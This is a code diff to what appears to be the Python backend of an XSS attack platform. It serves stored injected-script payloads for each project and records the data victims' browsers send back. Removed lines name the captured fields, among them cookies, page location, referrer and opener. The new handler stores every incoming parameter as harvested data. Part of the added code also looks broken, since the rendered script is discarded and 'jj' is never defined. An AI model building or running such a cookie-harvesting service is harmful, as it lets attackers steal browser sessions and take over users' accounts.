@@ -1,3 +1,4 @@
+import json
 from lib.settings import *
 from lib.models import *
 from lib.language.en import *
@@ -6,14 +7,7 @@ from lib.valid import RegValidChecker
 from lib.xss_core import get_cookie
 
 
-TYPE_DICT = {
-    '0': get_cookie,
-    '1': None,
-}
-
-
 class BaseHandler(object):
-
     def render(self, title, template, **kwargs):
         return env.get_template(template).render(title=title, **kwargs)
 
@@ -35,28 +29,40 @@ class UserHandler(BaseHandler):
 
 
 class XSScriptHandler(BaseHandler):
-    def GET(self):
-        pass
+    def GET(self, project_id):
+        core = get_project_detail(project_id)
+        if not core:
+            return
+        code = get_xss_code(core)
+        if not code:
+            return
+
+        xss_script = jj.Template(code)
+        xss_script.render()
 
 
 class XSSHandler(BaseHandler):
     def GET(self):
-        web_input = web.input(
-            type='',
-            id='',
-            xss_location='',
-            xss_toplocation='',
-            xss_title='',
-            xss_opener='',
-            xss_cookie='',
-            xss_referrer='',
+        web_input = web.input()
+        try:
+            project_id = int(web_input.id)
+            del web_input['id']
+        except ValueError:
+            return ''
+        except KeyError:
+            return ''
+        raw_data = json.dumps(json.dumps(web_input))
+        save_raw_data(
+            project_id=project_id,
+            raw_data=raw_data,
         )
-        return TYPE_DICT[web_input.type](web_input)
+        return ''
 
 
 class XSSResultHandler(BaseHandler):
     def GET(self):
         pass
+        #return TYPE_DICT
 
 
 class RegHandler(BaseHandler):
